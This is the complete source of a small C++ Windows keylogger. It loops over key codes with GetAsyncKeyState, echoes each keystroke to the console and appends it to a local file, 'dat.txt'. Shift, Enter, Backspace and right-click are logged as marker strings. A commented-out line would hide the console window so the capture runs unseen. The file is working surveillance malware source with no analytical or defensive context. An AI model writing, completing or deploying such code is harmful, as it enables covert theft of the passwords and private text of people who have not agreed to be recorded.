// logger.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdio.h>
#include <iostream>
#include <fstream>


using namespace std;


bool SpecialKeys(int key);

int _tmain(int argc, _TCHAR* argv[])
{
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	//auto KEY = 'x';

	while (true) {
		Sleep(10);
		for (auto key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) == -32767) {
				if (SpecialKeys(key) == false) {
					cout<<char(key);
					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(key);
						LogFile.close();
					}

				}
			}
		}
	}
}


void LOG(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input<<endl;
		LogFile.close();
	}
}


bool SpecialKeys(int Key) {
	switch (Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		LOG("\n");
		return true;
	case '¾':
		cout << ".";
		LOG(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		LOG("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		LOG("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		LOG("#R_CLICK#");
		return true;
	default: 
		return false;
	}
}

